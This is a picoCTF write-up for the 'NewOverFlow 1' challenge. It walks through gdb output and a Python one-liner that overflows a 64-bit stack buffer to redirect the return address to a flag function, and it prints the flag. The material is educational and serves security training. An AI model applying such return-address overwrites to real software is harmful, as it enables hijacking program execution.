# NewOverFlow 1
Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this [program](vuln). You can find it in /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123 on the shell server. [Source](vuln.c).

## Hint
Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes

## Solution
Same method from OverFlow 1. We input 64 bytes of a's, check the buffer and see how far we were from the return address.
```asm
(gdb) disas main
...
   0x0000000000400845 <+93>:    callq  0x4007cc <vuln>
   0x000000000040084a <+98>:    mov    $0x0,%eax
```
Address is 0x000000000040084a
```asm
(gdb) b *vuln+25
Breakpoint 1 at 0x4007e5
(gdb) r
Starting program: /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123/vuln
Welcome to 64-bit. Give me a string that gets you the flag:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x00000000004007e5 in vuln ()
(gdb) x/50x $rsp
0x7ffe8a14ca30: 0x61616161      0x61616161      0x61616161      0x61616161
0x7ffe8a14ca40: 0x61616161      0x61616161      0x61616161      0x61616161
0x7ffe8a14ca50: 0x61616161      0x61616161      0x61616161      0x61616161
0x7ffe8a14ca60: 0x61616161      0x61616161      0x61616161      0x61616161
0x7ffe8a14ca70: 0x8a14ca00      0x00007ffe      0x0040084a      0x00000000
```
The return address is saved at 0x7ffe8a14ca78, so we need to fill in 8 more bytes and then `flag`'s address. However, when we try to do this, we run into a segmentation fault with the payload:
```python -c "import struct; print 'a'*(64+8)+struct.pack('I', 0x00400767)" | ./vuln```
It turns out that the solution was to jump to the address 0x00400768 and not 0x00400767, skipping the `push %rbp` instruction. Unusually, the first time I tried it, it seemed to have worked with the address 0x00400767, now it seems that it doesn't work anymore. Thus, our final payload should be:
```python -c "import struct; print 'a'*(64+8)+struct.pack('I', 0x00400768)" | ./vuln```

## Details
Completed: *During competition*  
Done by: Cyril  
Flag: `picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}`
